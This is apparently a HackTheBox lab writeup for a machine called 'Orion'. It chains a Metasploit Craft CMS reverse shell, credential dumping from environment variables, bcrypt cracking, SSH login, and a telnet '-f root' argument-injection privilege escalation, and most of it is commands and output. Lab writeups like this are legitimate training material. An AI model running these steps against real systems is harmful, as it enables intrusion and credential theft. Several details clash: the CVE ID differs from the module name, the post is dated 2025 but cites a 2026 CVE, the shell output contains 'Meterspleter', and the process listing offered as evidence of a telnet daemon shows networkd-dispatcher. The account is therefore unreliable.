---
title: Orion - HackTheBox Writeup
date: 2025-12-10 11:50:00 +0100
categories: [HackTheBox, Web, Privilege Escalation]
tags: [craft-cms, cve-2025-46731, mysql, telnet, cve-2026-24061, metasploit]
image:
  path: /assets/img/orion/cover.png
---

## Machine Overview

| Property | Value |
|----------|-------|
| **Machine Name** | Orion |
| **IP Address** | 10.129.244.146 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Web Framework** | Craft CMS 5.6.16 |

---

## Initial Setup

First, add the domain to your `/etc/hosts` file to properly resolve the hostname:

```bash
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

This allows us to access the application via `http://orion.htb` instead of using the raw IP address.

---

## Reconnaissance & Enumeration

### Web Application Analysis

Browsing the website reveals important information:

- **CMS Framework**: Craft CMS
- **Version Identified**: 5.6.16

After performing directory fuzzing, we discover an admin endpoint:

```
http://orion.htb/admin
```

This is our entry point for exploitation.

---

## Vulnerability Discovery: CVE-2025-46731

### CVE Research

With Craft CMS version 5.6.16 identified, a quick CVE search reveals **CVE-2025-46731**, a critical vulnerability in this version.

### Metasploit Module

Let's check if there's a public exploit available:

```bash
msfconsole
msf6 > search craft cms
```

Excellent! There's a dedicated Metasploit module for this vulnerability:

```bash
msf6 > use exploit/linux/http/craftcms_breach_rce_cve_2025_34632
msf6 exploit(linux/http/craftcms_breach_rce_cve_2025_34632) > set RHOSTS 10.129.244.146
msf6 exploit(linux/http/craftcms_breach_rce_cve_2025_34632) > run
```

### Initial Shell Access

After running the exploit, we obtain a reverse shell connection:

![Metasploit Exploit Execution](/assets/img/orion/3-1.png)

```
[+] Started reverse TCP handler on 10.10.15.128:4444
[+] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable...
[+] Session path leaked: /var/lib/php/sessions
[+] Injecting stub & triggering payload...
[+] Meterspleter session 1 opened (10.10.15.128:4444 -> 10.129.244.146:...)
```

We now have a shell, though not fully interactive yet.

---

## Credential Extraction

### Environment Variables Enumeration

Let's upgrade to a proper shell and enumerate the environment:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
env
```

Examining the environment variables, we discover critical database credentials:

```
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Along with the indication that the database user is **root**.

### Database Access

Now that we have the database credentials, let's connect to MySQL:

```bash
mysql -u root -p
Enter password: SuperSecureCraft123Pass!
```

Success! We're authenticated to the MySQL database.

### User Enumeration

Let's explore the Orion database:

```sql
use orion;
show tables;
select * from users;
```

This reveals user accounts in the system, including one for **adam**.

### Hash Extraction

From the database, we extract the password hash for the adam user:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

This is a **bcrypt hash** ($2y$ prefix).

---

## Initial Access via SSH

### Password Cracking

Let's use John the Ripper to crack the bcrypt hash:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Password**: `darkangel`

### SSH Connection

Now we can authenticate as the adam user via SSH:

```bash
ssh adam@10.129.244.146
Password: darkangel
```

We've successfully obtained initial access to the machine!

---

## Privilege Escalation

### Service Discovery

Let's check what network services are running:

```bash
ss -tulnp
```

Interesting finding! A service is listening on **port 23** (TCP):

```
tcp  LISTEN  0  100  127.0.0.1:23  0.0.0.0:*
```

Port 23 is typically associated with **Telnet**, though it's often disabled on modern systems.

### Process Analysis

Looking at running processes:

```bash
ps aux | grep -E 'telnet|login|23'
```

We find:

```
root   955  0.0  0.4  32764 19324  ?  Ss  11:50  0:00  /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```

This indicates there's likely a custom Telnet daemon running as root.

---

## Vulnerability Discovery: CVE-2026-24061

### The Telnet/Login Vulnerability

After research, we identify **CVE-2026-24061** - a critical flaw in the `/usr/bin/login` binary when invoked by Telnet services.

### How the Vulnerability Works

The vulnerability exploits improper argument parsing in `/usr/bin/login`:

1. Telnet daemon connects and passes arguments to `/usr/bin/login`
2. The Telnet daemon runs with root privileges
3. The `-f` flag in `/usr/bin/login` forces authentication **bypass**
4. When `-f root` is passed, it skips authentication and logs in as root directly

### Exploitation

Let's connect via Telnet using the `-f root` argument:

```bash
export USER="-f root"
telnet 127.0.0.1 23
```


The key insight is that when Telnet invokes `/usr/bin/login` with root privileges:

```
# What Telnet passes:
/usr/bin/login -f root

# Equivalent to:
sudo /usr/bin/login -f root
```

Since the `-f` flag forces authentication bypass, and the process runs as root, we're authenticated as root without providing a password.

### Root Access Achieved

```bash
telnet 127.0.0.1 23
# [Connected to Telnet service]
# [Automatically logged in as root due to CVE-2026-24061]

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
[FLAG_CONTENT]
```

Machine successfully compromised!

---

## Summary

This machine demonstrated sophisticated attack vectors combining multiple techniques:

| Vulnerability | Type | Impact | Severity |
|---------------|------|--------|----------|
| **CVE-2025-46731** | RCE (Craft CMS) | Initial shell access | Critical |
| **Cleartext DB Credentials** | Information Disclosure | Database compromise | High |
| **Weak Password Hashing** | Weak Cryptography | Password recovery | High |
| **CVE-2026-24061** | Privilege Escalation | Root access | Critical |

### Attack Chain

```
Enumeration → Craft CMS Identification → CVE-2025-46731 Exploit → 
Initial Shell → Environment Variables Dumping → Database Access → 
User Hash Extraction → John the Ripper Cracking → SSH Access → 
Service Discovery (Port 23) → CVE-2026-24061 Exploitation → Root Access
```

### Key Learnings

1. **CMS Vulnerabilities** - Always identify and check for CVEs in identified frameworks
2. **Credential Storage** - Never store sensitive credentials in environment variables
3. **Weak Password Policies** - Database credentials should be complex and rotated
4. **Uncommon Services** - Investigate non-standard services running on unusual ports
5. **Authentication Bypass** - Test for argument injection in authentication binaries
6. **Privilege-Running Services** - Services running as root are prime targets for escalation

---

## Tools & Techniques Used

| Tool | Purpose |
|------|---------|
| `nmap/gobuster` | Reconnaissance & endpoint discovery |
| `msfconsole` | Exploit delivery & shell handling |
| `mysql` | Database enumeration |
| `john` | Password hash cracking (bcrypt) |
| `ssh` | Remote authentication |
| `ss` | Service discovery |
| `telnet` | Exploit delivery (CVE-2026-24061) |

---

## References

- [CVE-2025-46731 - Craft CMS Breach RCE](https://cve.mitre.org)
- [CVE-2026-24061 - Telnet/Login Authentication Bypass](https://cve.mitre.org)
- [Bcrypt Hash Cracking with John](https://www.openwall.com/john/)
- [MySQL Security Best Practices](https://dev.mysql.com/doc/)

---

*Last Updated: 2025-12-10*
